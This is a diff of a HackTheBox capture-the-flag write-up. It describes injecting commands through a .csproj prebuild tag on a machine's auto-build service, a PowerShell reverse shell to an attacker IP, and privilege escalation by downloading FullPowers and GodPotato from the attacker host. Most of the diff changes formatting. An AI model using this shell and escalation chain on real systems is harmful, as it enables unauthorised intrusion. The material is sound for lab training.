@@ -16,28 +16,28 @@ HackTheBox: Medium
 </aside>
 
 ## 1: Enumeration
-
+<br/><br/>
 - nmap scanning
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled.png' | relative_url }})
-
+<br/><br/>
 We find there’s a http service hosted in apache with php
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_1.png' | relative_url }})
-
+<br/><br/>
 This service allows to make the build project in a automated way, we can see a section where we just put the url repo and wait for it.
-
+<br/><br/>
 First at all we test functionality
-
+<br/><br/>
 To get into the machine successfully we need some files:
-
+<br/><br/>
 1. A repository with c# code
 2. A file .csproj and .sln
 3. A rev shell to access to the machine once the code is injected
-
+<br/><br/>
 > The machine doesn’t have access to internet therefore we need to run a private server where we could get the repo, we get this in this way
 > 
-
+<br/><br/>
 ```bash
 git --bare clone external_repo
 cd repo/.git
@@ -46,16 +46,14 @@ mv hooks/post-updte.sample hooks/post-update
 cd ..
 python -m http.server 8000
 ```
-
+<br/><br/>
 > .csproj = This file has the possibility of iinject commands through prebuild tag.
 > 
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_2.png' | relative_url }})
-
- 
-
+<br/><br/>
 ## 2: User flag
-
+<br/><br/>
 ```bash
 $socket = new-object System.Net.Sockets.TcpClient('10.10.14.14', 2222);
 if($socket -eq $null){exit 1}
@@ -112,52 +110,55 @@ $writer.close();
 $socket.close();
 $stream.Dispose()
 ```
-
+<br/><br/>
 Con este rev shell ponemos en escucha en el puerto establecido y ya obtenemos acceso 
-
+<br/><br/>
 ```powershell
 cmd /c type c:\Users\enox\Desktop\user.txt
 ```
-
+<br/><br/>
 ## 3: Priv esc
-
+<br/><br/>
 wrapper pred:
-
+<br/><br/>
 ```powershell
 cd C:\xampp\htdocs\uploads
 ```
-
+<br/><br/>
 Revisamos privilegios
-
+<br/><br/>
 ```powershell
 whoami /priv
 ```
-
+<br/><br/>
 Check some privileges and look “ImpersonatePrivilege” is not present
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_3.png' | relative_url }})
-
+<br/><br/>
 We cannot modify or access to files but we can create them
-
+<br/><br/>
 Use the server early running and add fullpowers, a POC that rest default privileges
-
+<br/><br/>
 With impersonate privileges we can assume other identities, sometime interesting that happens to me in this machine is that i had to reset the machine to make work fullpowers properly
-
+<br/><br/>
 ```powershell
 cmd /c powershell Invoke-WebRequest -Uri http://10.10.00.000:0000/fullpowers.exe -OutFile Fullpowers.exe
 fullpowers.exe
 ```
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_4.png' | relative_url }})
-
+<br/><br/>
 We got all priv is time to use godpotato and get the whole power
-
+<br/><br/>
 ```powershell
 powershell Invoke-WebRequest -Uri http://10.10.14.14:8000/GodPotato.exe -OutFile GodPotato.exe
-GodPotato-NET64 -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
+godPotato-NET64 -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
 ```
-
+<br/><br/>
 There was a problem, godpotato which will allow us to run commands as system had 3 exe’s and only the 64 one worked
-
+<br/><br/>
 Machine pwned!!
 <script src="{{ '/assets/js/matrix-overlay.js' | relative_url }}"></script>
+
+
+<link rel="stylesheet" href="{{ '/assets/css/imagesstyle.css' | relative_url }}">
